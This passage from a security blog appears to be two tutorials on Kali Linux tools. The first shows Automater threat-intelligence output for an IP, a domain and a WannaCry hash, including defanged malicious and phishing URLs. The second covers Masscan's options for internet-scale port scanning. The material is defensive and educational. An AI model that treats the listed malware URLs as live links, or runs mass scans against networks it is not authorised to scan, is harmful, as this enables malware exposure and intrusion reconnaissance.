/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: 185.62.190.110     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
No results found in the RTex DNS
No results found in the FNet URL
[+] VT ASN: No results found
[+] VT Country: ZZ
[+] VT AS Owner: No results found
[+] VT pDNS: (&lsquo;2016-08-24 00:00:00&rsquo;, &lsquo;cl0.f-aws.com&rsquo;)
[+] VT pDNS: (&lsquo;2017-05-19 00:00:00&rsquo;, &lsquo;mail.attw.io&rsquo;)
[+] VT pDNS: (&lsquo;2016-06-05 00:00:00&rsquo;, &lsquo;weinne.net&rsquo;)
[+] VT pDNS: (&lsquo;2017-02-08 00:00:00&rsquo;, &lsquo;www[.]woodmann.com&rsquo;)
[+] VT Malware: (&lsquo;2017-06-02 10:46:35&rsquo;, &lsquo;ceeca0c7dc341fa57532470f2d7caaa427bf77e1e533b7ff3d9d8e245d6ea5fd&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Corso_2009-2-4_20.20_Corso_7.02.34.rar&rsquo;, &lsquo;2017-06-07 17:23:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Vbdec34.zip&rsquo;, &lsquo;2017-06-04 23:44:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/&rsquo;, &lsquo;2017-06-02 11:41:58&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/dongles/vdog104.zip&rsquo;, &lsquo;2017-06-02 10:46:33&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/archives/bartpak7.rar&rsquo;, &lsquo;2017-06-01 19:35:43&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_de_decompiler_2009-7-18_22.55_de_decompiler_lite.zip|>de_decompiler_lite.exe&rsquo;, &lsquo;2017-06-01 14:57:19&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:RCE_Tools&rsquo;, &lsquo;2017-05-31 09:16:42&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:SoftICE_Extensions&rsquo;, &lsquo;2017-05-27 18:28:27&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/attachment.php?s=d1dedc683453c119989330b5967a2dea&amp;attachmentid=2311&amp;d=1278836882&rsquo;, &lsquo;2017-05-26 20:45:35&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/fravia/exe/cryptpad.exe&rsquo;, &lsquo;2017-05-26 18:00:12&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_LordPE_2010-6-29_3.9_LordPE_1.41_Deluxe_b.zip&rsquo;, &lsquo;2017-05-26 13:50:29&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/LordPE&rsquo;, &lsquo;2017-05-26 13:42:00&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/dongles/admon25.rar&rsquo;, &lsquo;2017-05-25 05:51:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_wintruder_2008-10-24_22.21_wintruder.zip&rsquo;, &lsquo;2017-05-24 12:33:31&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Echo_Mirage_2014-1-11_17.28_EchoMirage-3.1.rar&rsquo;, &lsquo;2017-05-24 10:42:52&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Archives/Kgensrcs.zip&rsquo;, &lsquo;2017-05-19 18:39:05&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_zeroadd_2014-5-9_1.29_zeroadd.zip&rsquo;, &lsquo;2017-05-16 08:33:15&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Unpackers/Arm201b1.zip&rsquo;, &lsquo;2017-05-11 22:16:38&rsquo;)
[+] VT Mal URLs: (&ldquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_stuxnet&rsquo;s_rootkit<em>(mrxnet)</em>into_c++<em>2011-2-6_13.54_mrxnet.rar&rdquo;, &lsquo;2017-05-11 06:28:02&rsquo;)
[+] VT Mal URLs: (&ldquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&rsquo;s_Rootkit</em>(MRxNet)<em>into_C++</em>2011-2-6_13.54_MRxNet.rar&rdquo;, &lsquo;2017-05-10 11:56:48&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/&rsquo;, &lsquo;2017-05-09 13:25:03&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Edgehasp.zip&rsquo;, &lsquo;2017-05-09 06:50:13&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Kernel_Detective&rsquo;, &lsquo;2017-05-07 23:49:45&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/BobSoft/Pages/Plugins/ImmDbg&rsquo;, &lsquo;2017-05-02 19:47:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/AdmiralDebilitate&rsquo;, &lsquo;2017-04-29 23:08:33&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tutorials/Nolflex3.htm&rsquo;, &lsquo;2017-04-21 23:28:28&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_ImpREC_2011-7-16_8.11_ImpREC_1.7e.rar&rsquo;, &lsquo;2017-04-20 17:33:51&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Detect_It_Easy&rsquo;, &lsquo;2017-04-19 22:55:52&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/attachment.php&rsquo;, &lsquo;2017-04-19 21:13:35&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_IIDKing_2007-10-19_23.37_tf23.zip&rsquo;, &lsquo;2017-04-18 10:44:44&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_RTA_2011-9-6_20.52_rta2b2.zip&rsquo;, &lsquo;2017-04-13 08:16:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Haspdll.zip&rsquo;, &lsquo;2017-04-11 17:42:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools&rsquo;, &lsquo;2017-04-10 16:46:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Unpackers/ArmStripper01b6.rar&rsquo;, &lsquo;2017-04-10 04:09:19&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Echo_Mirage&rsquo;, &lsquo;2017-04-08 16:34:47&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/accessroot/arteam/site/download.php?view.331&rsquo;, &lsquo;2017-04-05 05:34:20&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Unpacker_PECompact_2014-1-15_15.34_Unpacker_PECompact.rar&rsquo;, &lsquo;2017-04-02 21:39:34&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/forum.php&rsquo;, &lsquo;2017-03-24 13:36:54&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Superkill_2009-6-4_22.16_Superkill-V1.0.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Wm.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Cdtools.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/FLEXlm/Lmv8gen.zip&rsquo;, &lsquo;2017-03-15 18:06:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/tkc/06.zip&rsquo;, &lsquo;2017-03-14 19:32:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Archives/Crackmes.zip&rsquo;, &lsquo;2017-03-14 19:32:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_virut.a_malware_analysis_paper_2010-9-3_15.53_virut.a.rar&rsquo;, &lsquo;2017-03-14 14:34:44&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php&rsquo;, &lsquo;2017-03-14 09:22:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/stones.zip&rsquo;, &lsquo;2017-03-11 00:34:59&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/fravia/sources/WINUSER.H&rsquo;, &lsquo;2017-03-08 11:57:20&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_chimprec_2008-6-24_13.59_chimprec.zip|>chimprec.exe&rsquo;, &lsquo;2017-03-08 11:15:11&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/&rsquo;, &lsquo;2017-03-03 07:12:55&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/id-site.zip&rsquo;, &lsquo;2017-02-24 01:16:48&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&amp;&rsquo;, &lsquo;2017-02-15 15:19:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/BobSoft/Files/Other/PEiD-0.95-20081103.zip&rsquo;, &lsquo;2017-02-15 00:46:58&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Miscarc.zip&rsquo;, &lsquo;2017-02-09 14:37:08&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/pack/icepack.mp3.lz&rsquo;, &lsquo;2016-10-09 15:24:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/pack/efect.txt.lz&rsquo;, &lsquo;2016-10-09 15:24:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/lib/<strong>future</strong>.pyc.lz&rsquo;, &lsquo;2016-10-09 15:24:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/miles/mssa3d.m3d.lz&rsquo;, &lsquo;2016-10-09 15:24:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/app/normalize.css&rsquo;, &lsquo;2016-10-09 15:24:37&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/bgm/xmas.mp3.lz&rsquo;, &lsquo;2016-10-09 15:24:38&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/devil.dll.lz&rsquo;, &lsquo;2016-10-09 15:24:37&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2asgard/client/mark/10.tga.lz&rsquo;, &lsquo;2016-09-27 17:36:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2asgard/client/mark/10_1.tga.lz&rsquo;, &lsquo;2016-09-27 17:34:08&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/Deutsche-Bank/db/erfolg.html&rsquo;, &lsquo;2016-03-07 08:56:47&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/Deutsche-Bank/db/db.php&rsquo;, &lsquo;2016-02-29 13:36:45&rsquo;)
[+] Blacklist from IPVoid: No results found
[+] ISP from IPvoid: No results found
[+] Country from IPVoid: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
[+] Reputation Authority Score: 50/100
[+] FreeGeoIP Country Name: Netherlands
[+] FreeGeoIP Region Name: No results found
[+] FreeGeoIP City: No results found
[+] FreeGeoIP Zipcode: No results found
[+] FreeGeoIP Latitude: 52.3824
[+] FreeGeoIP Longitude: 4.8995
[+] SANS total target IPs seen: No results found
[+] SANS total packets blocked: No results found
[+] SANS last seen on: No results found
[+] SANS first seen on: No results found
No results found in the THIP
No results found in the TekHP
[+] ProjectHoneypot activity type: No results found
[+] ProjectHoneypot first mail received: No results found
[+] ProjectHoneypot last mail received: No results found
[+] ProjectHoneypot total mails received: No results found
[+] ProjectHoneypot spider first seen: No results found
[+] ProjectHoneypot spider last seen: No results found
[+] ProjectHoneypot spider sightings: No results found
[+] ProjectHoneypot user-agent sightings: No results found
[+] ProjectHoneypot first post on: No results found
[+] ProjectHoneypot last post on: No results found
[+] ProjectHoneypot form posts: No results found
[+] ProjectHoneypot first rule break on: No results found
[+] ProjectHoneypot last rule break on: No results found
[+] ProjectHoneypot rule break sightings: No results found
[+] ProjectHoneypot first dictionary attack on: No results found
[+] ProjectHoneypot last dictionary attack on: No results found
[+] ProjectHoneypot dictionary attack sightings: No results found
[+] ProjectHoneypot harvester first seen: No results found
[+] ProjectHoneypot harvester last seen: No results found
[+] ProjectHoneypot harvester sightings: No results found
[+] ProjectHoneypot harvester results: No results found
```</p>

<p>I&rsquo;ve used the IP of the Woodmann reverse engineering community. From the output, you can see that it&rsquo;s clean, excepting some files flagged by VirusTotal, as would be expected from a place where executable samples are shared for RE :)</p>

<ul>
<li>check domain for malware</li>
</ul>


<p>```
automater corefitness.info
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: corefitness.info     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
No results found in the FNet URL
No results found in the Un Redirect
[+] IP from URLVoid: 76.74.155.21
[+] Blacklist from URLVoid: No results found
[+] Domain Age from URLVoid: 2009-12-08 (8 years ago)
[+] Geo Coordinates from URLVoid: 40.6888 / -74.0203
[+] Country from URLVoid:  (US) United States
[+] pDNS data from VirusTotal: (&lsquo;2017-04-02&rsquo;, &lsquo;107.180.51.40&rsquo;)
[+] pDNS data from VirusTotal: (&lsquo;2016-12-14&rsquo;, &lsquo;76.74.155.21&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-10&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-09&rsquo;, &lsquo;hxxp://corefitness.info/b/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-07&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-04-04&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-16&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-08&rsquo;, &lsquo;hxxp://corefitness.info/workouts/men/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-07&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-02-25&rsquo;, &lsquo;hxxp://corefitness.info/workouts/women/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-02-05&rsquo;, &lsquo;hxxp://corefitness.info/workouts/men/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-23&rsquo;, &lsquo;hxxp://corefitness.info/b/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-22&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-21&rsquo;, &lsquo;hxxp://corefitness.info/1.exe/&rsquo;)
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
No results found in the THIP
[+] McAfee Web Risk: No results found
[+] McAfee Web Category: No results found
[+] McAfee Last Seen: No results found
```</p>

<p>Here I picked a random URL from the <a href="https://isc.sans.edu/feeds/suspiciousdomains_High.txt">SANS suspicious domains list</a>. It seems that if your search for fitness leads you there, your computer won&rsquo;t be very fit D:</p>

<ul>
<li>chech hash for maliciousness</li>
</ul>


<p>```
automater b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
[+] MD5 found on VT: 1
[+] Scan date submitted: 2017-06-09 04:35:58
[+] Detected Engines: 54
[+] Total Engines: 61
[+] Vendor | Classification: (&lsquo;MicroWorld-eScan&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;nProtect&rsquo;, &lsquo;Ransom/W32.WannaCry.Zen&rsquo;)
[+] Vendor | Classification: (&lsquo;CAT-QuickHeal&rsquo;, &lsquo;Ransom.WannaCrypt.A4&rsquo;)
[+] Vendor | Classification: (&lsquo;McAfee&rsquo;, &lsquo;Ransom-WannaCry!4287E15AF619&rsquo;)
[+] Vendor | Classification: (&lsquo;Malwarebytes&rsquo;, &lsquo;Ransom.WannaCrypt&rsquo;)
[+] Vendor | Classification: (&lsquo;Zillya&rsquo;, &lsquo;Trojan.WannaCryptGen.Win32.2&rsquo;)
[+] Vendor | Classification: (&lsquo;SUPERAntiSpyware&rsquo;, &lsquo;Ransom.WannaCrypt/Variant&rsquo;)
[+] Vendor | Classification: (&lsquo;K7GW&rsquo;, &lsquo;Exploit ( 0050d7a31 )&rsquo;)
[+] Vendor | Classification: (&lsquo;K7AntiVirus&rsquo;, &lsquo;Exploit ( 0050d7a31 )&rsquo;)
[+] Vendor | Classification: (&lsquo;Arcabit&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;Baidu&rsquo;, &lsquo;Win32.Worm.Rbot.a&rsquo;)
[+] Vendor | Classification: (&lsquo;Cyren&rsquo;, &lsquo;W32/Trojan.ZTSA-8671&rsquo;)
[+] Vendor | Classification: (&lsquo;Symantec&rsquo;, &lsquo;Ransom.Wannacry&rsquo;)
[+] Vendor | Classification: (&lsquo;TrendMicro-HouseCall&rsquo;, &lsquo;Ransom_WCRY.SMB&rsquo;)
[+] Vendor | Classification: (&lsquo;Avast&rsquo;, &lsquo;Win32:WanaCry-A [Trj]&rsquo;)
[+] Vendor | Classification: (&lsquo;Kaspersky&rsquo;, &lsquo;Trojan-Ransom.Win32.Wanna.m&rsquo;)
[+] Vendor | Classification: (&lsquo;BitDefender&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;NANO-Antivirus&rsquo;, &lsquo;Trojan.Win32.Wanna.eovgam&rsquo;)
[+] Vendor | Classification: (&lsquo;AegisLab&rsquo;, &lsquo;Troj.Ransom.W32.Wanna.toNz&rsquo;)
[+] Vendor | Classification: (&lsquo;Ad-Aware&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;Emsisoft&rsquo;, &lsquo;Trojan-Ransom.WanaCrypt0r (A)&rsquo;)
[+] Vendor | Classification: (&lsquo;Comodo&rsquo;, &lsquo;UnclassifiedMalware&rsquo;)
[+] Vendor | Classification: (&lsquo;F-Secure&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;DrWeb&rsquo;, &lsquo;Trojan.Encoder.11432&rsquo;)
[+] Vendor | Classification: (&lsquo;VIPRE&rsquo;, &lsquo;Trojan.Win32.Generic!BT&rsquo;)
[+] Vendor | Classification: (&lsquo;TrendMicro&rsquo;, &lsquo;Ransom_WCRY.SMB&rsquo;)
[+] Vendor | Classification: (&lsquo;McAfee-GW-Edition&rsquo;, &lsquo;Ransom-WannaCry!4287E15AF619&rsquo;)
[+] Vendor | Classification: (&lsquo;Sophos&rsquo;, &lsquo;Troj/Ransom-EMG&rsquo;)
[+] Vendor | Classification: (&lsquo;SentinelOne&rsquo;, &lsquo;static engine &ndash; malicious&rsquo;)
[+] Vendor | Classification: (&lsquo;F-Prot&rsquo;, &lsquo;W32/WannaCrypt.D&rsquo;)
[+] Vendor | Classification: (&lsquo;Jiangmin&rsquo;, &lsquo;Trojan.WanaCry.i&rsquo;)
[+] Vendor | Classification: (&lsquo;Webroot&rsquo;, &lsquo;W32.Ransom.Wannacry&rsquo;)
[+] Vendor | Classification: (&lsquo;Avira&rsquo;, &lsquo;BDS/Agent.ilyda&rsquo;)
[+] Vendor | Classification: (&lsquo;Endgame&rsquo;, &lsquo;malicious (high confidence)&rsquo;)
[+] Vendor | Classification: (&lsquo;Microsoft&rsquo;, &lsquo;Ransom:Win32/WannaCrypt.A!rsm&rsquo;)
[+] Vendor | Classification: (&lsquo;ZoneAlarm&rsquo;, &lsquo;Trojan-Ransom.Win32.Wanna.m&rsquo;)
[+] Vendor | Classification: (&lsquo;ALYac&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor&rsquo;)
[+] Vendor | Classification: (&lsquo;AVware&rsquo;, &lsquo;Trojan.Win32.Generic!BT&rsquo;)
[+] Vendor | Classification: (&lsquo;VBA32&rsquo;, &lsquo;Trojan.Filecoder&rsquo;)
[+] Vendor | Classification: (&lsquo;ESET-NOD32&rsquo;, &lsquo;Win32/Exploit.CVE-2017-0147.A&rsquo;)
[+] Vendor | Classification: (&lsquo;Tencent&rsquo;, &lsquo;Win32.Trojan.Raas.Auto&rsquo;)
[+] Vendor | Classification: (&lsquo;Yandex&rsquo;, &lsquo;Exploit.CVE-2017-0147!&rsquo;)
[+] Vendor | Classification: (&lsquo;Ikarus&rsquo;, &lsquo;Trojan-Ransom.WannaCry&rsquo;)
[+] Vendor | Classification: (&lsquo;Fortinet&rsquo;, &lsquo;W32/WannaCryptor.H!tr&rsquo;)
[+] Vendor | Classification: (&lsquo;AVG&rsquo;, &lsquo;Win32:WanaCry-A [Trj]&rsquo;)
[+] Vendor | Classification: (&lsquo;Panda&rsquo;, &lsquo;Trj/RansomCrypt.I&rsquo;)
[+] Vendor | Classification: (&lsquo;CrowdStrike&rsquo;, &lsquo;malicious_confidence_100% (W)&rsquo;)
[+] Vendor | Classification: (&lsquo;Qihoo-360&rsquo;, &lsquo;HEUR/QVM41.2.2698.Malware.Gen&rsquo;)
[+] Hash found at ThreatExpert: No results found
[+] Malicious Indicators from ThreatExpert: No results found
[+] Date found at VXVault: No results found
[+] URL found at VXVault: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
No results found in the THMD5
```</p>

<p>I&rsquo;ve grabbed a WannaCry hash and threw it at Automater, you can see it picked it up right away.</p>

<ul>
<li>HTML report of a scan</li>
</ul>


<p><img class="center" src="/images/tools/automater.png" title="&lsquo;automater&rsquo; &lsquo;automater HTML report&rsquo;" ></p>

<p><strong>Learn more:</strong></p>

<p>One of the cool features of Automater is its extensibility. You can add sites to the XML configuration file, and customize it to meet your needs. For further instructions about how to do that, check out the <a href="http://www.tekdefense.com/news/2013/12/10/the-extensibility-of-automater.html">author&rsquo;s post</a></p>

<p>```</p>

<hr />

<p>&lt; Condense soup, not books! ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
    <updated>2017-06-10T04:17:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>

<h2>masscan description</h2>

<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
million packets per second.</p>

<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>

<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
operating system to firewall the ports that masscan uses.</p>

<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>

<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
distant network.</p>

<p>By default, the rate is set to 100 packets/second.</p></blockquote>

<h2>masscan options</h2>

<p><code>
root@kali:~# masscan                                                         
usage:
masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
 scan some web ports on 10.x.x.x at 10kpps
masscan --nmap
 list those options that are compatible with nmap
masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
 save results of scan in binary format to &lt;filename&gt;
masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
 read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;
</code></p>

<p>More information:</p>

<p><code>
root@kali:~# masscan --help
MASSCAN is a fast port scanner. The primary input parameters are the
IP addresses/ranges you want to scan, and the port numbers. An example
is the following, which scans the 10.x.x.x network for web servers:
 masscan 10.0.0.0/8 -p80
The program auto-detects network interface/adapter settings. If this
fails, you'll have to set these manually. The following is an
example of all the parameters that are needed:
 --adapter-ip 192.168.10.123
 --adapter-mac 00-11-22-33-44-55
 --router-mac 66-55-44-33-22-11
Parameters can be set either via the command-line or config-file. The
names are the same for both. Thus, the above adapter settings would
appear as follows in a configuration file:
 adapter-ip = 192.168.10.123
 adapter-mac = 00-11-22-33-44-55
 router-mac = 66-55-44-33-22-11
All single-dash parameters have a spelled out double-dash equivalent,
so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
To use the config file, type:
 masscan -c &lt;filename&gt;
To generate a config-file from the current settings, use the --echo
option. This stops the program from actually running, and just echoes
the current configuration instead. This is a useful way to generate
your first config file, or see a list of parameters you didn't know
about. I suggest you try it now:
 masscan -p1234 --echo
</code></p>

<p>Config file:</p>

<blockquote><p>By default, the program will read default configuration from  the  file
/etc/masscan/masscan.conf. This is useful for system-specific settings,
such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
addresses,  so  that  you  can scan the entire Internet, while skipping
dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>

<p>Nmap compatible options:</p>

<p>```
root@kali:~# masscan &mdash;nmap                                                <br/>
